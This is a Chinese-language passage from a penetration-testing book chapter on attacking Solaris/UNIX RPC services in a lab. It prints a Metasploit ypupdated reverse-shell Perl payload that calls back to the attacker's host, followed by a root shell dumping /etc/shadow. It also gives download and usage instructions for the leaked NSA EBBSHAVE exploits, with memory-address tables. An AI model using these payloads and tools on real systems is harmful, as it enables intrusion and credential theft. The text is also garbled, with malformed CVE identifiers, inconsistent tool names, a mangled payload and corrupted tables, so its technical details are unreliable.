
此利用程序允许任何对 Mikrotik 设备具有有限访问权限的人通过文件创建 Telnet 调试功能远程启用 root shell，该功能在向厂商报告后已在 6.40.9 版本之后被移除。Telnet 和 Telnet 实现具有大量的历史和现代漏洞，它们在宿主机上的存在表明缺乏安全加固，这应该鼓励你将精力放在审查此类系统上。

## 安全外壳

应该使用 Secure Shell (SSH) 而不是 Telnet，因为最新版本的 SSH 在安全性方面比 Telnet 优得多。不知为何，我们在书中读到这里时还没有仔细研究这个极其有用且受欢迎的协议。SSH（详情请参见 RFC 4253）是一种常用服务，你会在它运行在面向网的外部主机（不一定推荐）以及 UNIX 和类 UNIX 系统的内部网络上。TCP 端口 22 是 SSH 的默认端口。系统管理员喜欢将其更改为更高的端口号——这并不能阻止黑客，但可以防止各种恶意软件。Telnet 和 Telnet 实现具有许多历史和现代漏洞，它们在宿主机上的存在表明缺乏安全加固，这应该鼓励你将精力放在审查此类系统上。

# 第 10 章 UNIX 327

| 程序号 | 版本 | 协议 | 端口 | 服务名 |
|---|---|---|---|---|
| 100133 | 1 | tcp | 32771 | nlockmgr |
| 100021 | 1 | udp | 4045 | nlockmgr |
| 100021 | 2 | udp | 4045 | nlockmgr |
| 100021 | 3 | udp | 4045 | nlockmgr |
| 100021 | 4 | udp | 4045 | nlockmgr |
| 100021 | 1 | tcp | 4045 | nlockmgr |
| 100021 | 2 | tcp | 4045 | nlockmgr |
| 100021 | 3 | tcp | 4045 | nlockmgr |
| 100021 | 4 | tcp | 4045 | nlockmgr |
| 100229 | 1 | tcp | 32772 | |
| 100229 | 2 | tcp | 32772 | |
| 100422 | 1 | tcp | 32773 | |
| 100242 | 1 | tcp | 32774 | |
| 106310 | 1 | tcp | 32775 | |
| 100001 | 2 | udp | 32773 | rstatd |
| 100003 | 3 | udp | 32773 | rstatd |
| 100001 | 4 | udp | 32776 | rusersd |
| 100002 | 2 | tcp | 32776 | rusersd |
| 100002 | 3 | tcp | 32776 | rusersd |
| 100002 | 2 | udp | 32774 | rusersd |
| 100003 | 3 | tcp | 32774 | rusersd |
| 100011 | 1 | udp | 32775 | rquotad |
| 100083 | 1 | tcp | 32777 | |
| 100068 | 2 | udp | 32776 | |
| 100068 | 3 | udp | 32776 | |
| 100068 | 4 | udp | 32776 | |
| 100068 | 5 | udp | 32776 | |
| 300598 | 1 | udp | 32779 | |
| 300598 | 1 | tcp | 32787 | |
| 805306368 | 1 | udp | 32779 | |
| 805306368 | 1 | tcp | 32787 | |
| 100249 | 1 | udp | 32780 | |
| 100249 | 1 | tcp | 32788 | |
| 100028 | 1 | tcp | 32791 | yupdated |
| 100028 | 1 | udp | 32784 | yupdated |

你需要查找尚未命名的程序号，查出该程序具体是什么，并检查此 RPC 程序是否存在漏洞。检查程序号的一种方法是查看 RFC 5531 的附录 C (`tools.ietf.org/html/rfc5531#page-27`)。

现在，让我们看看上一次输出中已经命名的某些程序。首先，让我们看看 `rusers`，你可以使用命令 `rusers <TargetIP>` 来查询它，假设你已经安装了客户端程序（`apt install rusers`）。这将会列出当前登录到系统的用户，如下所示：

```
192.168.56.107      helpdesk
```

之前的 Nmap 扫描结果显示了若干个标记为 `sometimes-rpc` 后跟数字的服务。那再次是扫描结果的一部分：

```
32771/tcp open sometimes-rpc5
32772/tcp open sometimes-rpc7
32773/tcp open sometimes-rpc9
32774/tcp open sometimes-rpc11
32775/tcp open sometimes-rpc13
32776/tcp open sometimes-rpc15
32777/tcp open sometimes-rpc17
32778/tcp open sometimes-rpc19
32779/tcp open sometimes-rpc21
32783/tcp open unknown
```

Nmap 不确定这些是否为 RPC。你会在 RPCinfo 提供的输出中列出相同的端口号，这也是为了确认是否存在 RPC 服务。在与 RPC 通信时，你需要确保正在使用正确的程序版本以及正确的 UDP TCP 端口。RPC 可以同时在 TCP 和 UDP 上运行，并且存在不同的程序版本，以兼容不同范围的系统。

如果你使用 Searchsploit 对 RPC 进行搜索，你会看到许多不仅影响 Solaris 同时也影响 Unix 操作系统的漏洞利用。以下是 Searchsploit 的输出示例：

- Caldera 8.0/UnixWare 7.1 / HP-UX 11.0 / Solaris 7.0 / SunOS 4.1.4 - rpc.cmsd Buffer Overflow (1)
- Caldera 8.0/UnixWare 7.1 / HP-UX 11.0 / Solaris 7.0 / SunOS 4.1.4 - rpc.cmsd Buffer Overflow (2)
- HP-UX 10/11 - IMAX 3/4 - OpenSolar build 8/9 / SunOS 4.1.4 - 'rpc.ypdget' Command Execution (1)
- HP-UX 10/11 - IMAX 3/4 - OpenSolar build 8/9 / SunOS 4.1.4 - 'rpc.ypdup' Command Execution (2)
- Open 5.0/5/6 - HP-UX 10/11 / Solaris 2.6/7.0 - rpc.ypd Buffer Overflow
- Solaris 10 - 'rpc.ypated' Remote Code Execution
- Solaris 10 - 'rpc.ypated' Remote Code Execution (Metploit)
- Solaris 10 2.5/1 - rpc.statd Call Relaying of Service
- Solaris 7.0 - rpc.ttdb Denial of Service
- Solaris 9 - RPC Denial Service

如果你搜索 RPC，你会发现许多 UNIX 系统的漏洞。现在来探索一些 Solaris 漏洞。

### CVE-2010-445

Searchploit 列表顶部有两个漏洞：rpc.cmsd Buffer Overflow (1) 和 rpc.cmsd Buffer Overflow (2)。这些是针对 CVE-2010-445 用 C 语言编写的两个不同漏洞。受影响的程序是程序号为 100 的 Calendar Service。漏洞是缓冲区溢出，允许远程攻击者向远程计算机注入代码以获取 root 权限。受此影响的平台包括 Solaris、AIX 和 HP-UX。针对 AIX 版本有一个名为 Tailored Access (TAO) 的模块，可以用于利用 calendar 服务。

### CVE-1999-029

针对 CVE-1999-029 的 rpc.ypupdated 远程代码执行漏洞也出现在 Searchploit 列表中。该漏洞还有一个 Met 模块。漏洞存在于 Yellow Pages Update (ypupdated)，这是一个旧的目录服务。今天（在外部）可能看不到它，但在当时它可以被用来获取密码和其他有用信息。该漏洞允许我们在远程主机上以 root 身份运行命令——以下是使用 `cmd/reverse_perl` 模块产生的输出：

```
[*] Started TCP handler on 192.168.56.102:4444
[*] 192.168.56.107:111 Sending PortMap request for ypupdated
[*] 192.168.56.107:111 Sending MAP UPDATE request with command 'perl-MIO -e $sp='fork;exit;if ($sp);foreach $key (keys %ENV) {if($ENV{\$key}) {\ENV{\$key}=$ENV{\$key}}}; $c=new IO::Socket::INET(PeerAddr=>192.168.56.102,Port=>4444); $fd=open($c,">|\|&); execclose($fd);while($__=\*/){system($1));'
[*] 192.168.56.107:111 Waiting for response...
[*] 192.168.56.107:111 No Errors, appears to have succeeded
```

```
[* Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.107:32809) at 2019-06-27 12:23:07 +0100

id
uid=0(root) gid=0(root)
cat /etc/shadow
root:s07b6ip172c:1721:::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uuc:NP:6445::::::
uccp:NP:6445::::::
smsmp:NP:6445::::::
listen:*LK*::::::
gdm:*LK*::::::
webservd:*LK*::::::
nbody:*LK*::::::
noaccass:*LK*::::::
dnobody:*LK*::::::
helpdesk:wpMDBFairip:1721::::::
billy:pcr6dcAXEYEP:1721::::::
petek:b3mSmPr48vTOKU:1721::::::
cliff:Vr2iLvp/oiM6:1721::::::
```

如果你查看该模块的输出，你会看到它已经向可以通信的服务更新程序发送了 MapRequest。它会发送一个带有附加 Perl 代码的 MAP UPDATE 请求（在之前的输出中高亮显示），该代码在远程机器上运行并连接回我们的 Kali Linux 机器，从而产生 shell。命令也被执行了，/etc/shadow 文件的内容已输出到屏幕。这个例子展示了就像其他服务一样，RPC 也可以包含简单的远程执行流。

# 第 10 章 UNIX

因为该工具中内置了反取证技术——这是 NSA 美国国家安全局开发的工具的共同特征。即使攻击失败，该利用程序仍然可以隐藏踪迹，并用乱码数据覆盖远程主机上的证据，以模糊攻击意图，从而在过程中防止漏洞被进一步利用！

# 黑客的圣杯 EBBSAVE

你可以从 `www.hackerhousebook.com/files/ebb.tgz` 下载 NSA 的 EBBSAVE 工具。一旦下载此压缩包，你需要使用 `tar -xvzf ebb.tgz` 对其进行解压。在内部，你将找到三个二进制文件：`ebnew_linux`、`ebbshave.v4` 和 `ebbshave.v5`。在使用这些利用程序时，你需要确保在 64 位 Linux 上安装了 32 位库，可以使用 `apt-get install lib32z1` 安装这些库。这些不同的系统都与同一个漏洞有关。让我们 `ebnew_linux`，运行命令 `./ebnew_linux` 将向你展示一些用法信息，如下所示：

```
./ebnew_linux version 2.0
Usage: ./ebnew_linux [-V] <target_ip> -p port
-r <program> (RPC program number)
-v <version> (version number)
-a <jumpaddress> (shellcode address)
-X|-F (use -X for "indirect"/xdr-replysm progs, -F for others.

如果你不知道这些这意味着，请停止并阅读文档。
-M <mtu> (要发送的数据包数据部分的大小 - 默认为 1260。影响 LZ 大小)
-s <source_port>
[-c prog] (程序编号。默认为 0)
[-P prog] (可选的可执行程序，重用利用程序的套接字)
```

要成功使用该利用程序，你将重用以下选项：

- 目标 IP 地址。
- RPC 程序的端口号。
- 一个 RPC 程序编号（这运行在目标机上）。
- 该 RPC 程序的版本号。
- 一个特定的内存地址（你不一定需要手动处理它！）

文档告诉，他们可以根据使用的 XDR 类型使用 -X 或 -F，并附带了一个警告：

> “如果你不知道这些这意味着，请停止并阅读文档。”

运行利用程序时显示的其他选项并非成功运行该工具所必需。

要使用此工具，NSA 操作员必须了解目标架构的细节，以及 RPC 服务提供的配置和所选选项的复杂之处。只要你拥有所有正确的内存地址，该利用程序将以近乎手术的方式提供一个 shell。在使用此工具时确实需要一些尝试，但毫无疑问，大量的远程 shell 通过这种方式被攻破。然而，有一种更简单的方法通过暴力破解使用 EBSHAVE，以获取所需的内存地址值。

# EBSHAVE 版本 4

虽然 `ebnew-linux` 要求操作员提供能够成功攻击的精确内存位置，但 `ebbave.v4` 不需要。`ebbave.v4` 使用暴力破解方法来实现系统，实际上是尝试不同的内存地址，直到找到正确的那个。这在每次尝试失败后都是可能的，服务将重启并允许使用新的内存地址重新尝试攻击。运行命令 `./ebbave.v4` 将显示用法选项，尽管并非所有内容都得到了解释。此版本可以在不提供许多选项的情况下运行，但也允许用户在需要时指定特定参数。

你将在用法文本中看到一个 Whackable Targets... 列表。这些可以成功被暴力破解的系统类型。系统的架构以及目标主机上 Solaris（或 SunOS）的版本决定了攻击是否成功。`ebbave.v4` 可以用于某些 SPARC 和 x86 系统，如下所示在打印的表中所示：

获取有关目标架构和 OS 版本信息的一种方法（假设你已作为非特权用户获取了 shell）是使用 `uname` 命令。`-a` 选项将打印所有信息。在你的 Solaris 10 虚拟机上运行此命令会产生以下信息：

```
SunOS unixserver0 5.10 Generic 8855-14 i386 i38pc
```

你可以看到这是一台 Intel 机器——i386 告诉了你。Nmap 扫描也会告诉你 RPC 运行在哪里。当你遇到版本 11 之前的 EBSHAVE 时，你应该可以使用它的工作原理。虽然不需要精确的内存位置，但你仍然需要提供架构和内存范围。工具将尝试不同的地址直到获取到一个。你还可以提供其他选项：例如 -c 选项，使用随机数据作为 shellcode 覆盖 /core 文件。换句话说，工具将自动尝试覆盖自己的踪迹，它通过崩溃服务来寻找内存地址。在尝试失败的情况下，shell 将被随机数据覆盖。这种功能在纯工具中是不见的，但它是内置在许多 NSA 工具中的。其理念是保持不被发现并保持利用程序的秘密。大多数利用程序和工具的设计并未达到这一标准，也罕见这种类型。我们在示例中针对的系统是 Solaris 10，但根据工具用法中的可用列表，可能并不显而易见。

| T | Software | Architecture | Start Address | End Address |
|---|---|---|---|---|
| 0 | 2.9 | SPARC | 0xffffa0 | 0xffffd0 |
| 1 | 2.9 | SPARCm | 0xfffffe00 | 0xfffffe00 |
| 2 | 2.9 | x86 | 0x0804700 | 0x080470 |
| 3 | 2.8 | SPARC | 0xfffffea0 | 0xffffd0 |
| 4 | 2.8 | SPARCm | 0xfffffe00 | 0xfffffe00 |
| 5 | 2.8 | x86 | 0x0804700 | 0x080470 |
| 6 | 2.7 | SPARC | 0x0002840 | 0x0002d1 |
| 7 | 2.7 | x86 | 0x0805170 | 0x080550 |
| 8 | 2.7 | SPARC | 0x0002910 | 0x0002f0 |
| 9 | 2.7 | x86 | 0x0805250 | 0x080560 |
| 10 | 2.7 | SPARC | 0x0006200 | 0x0007100 |
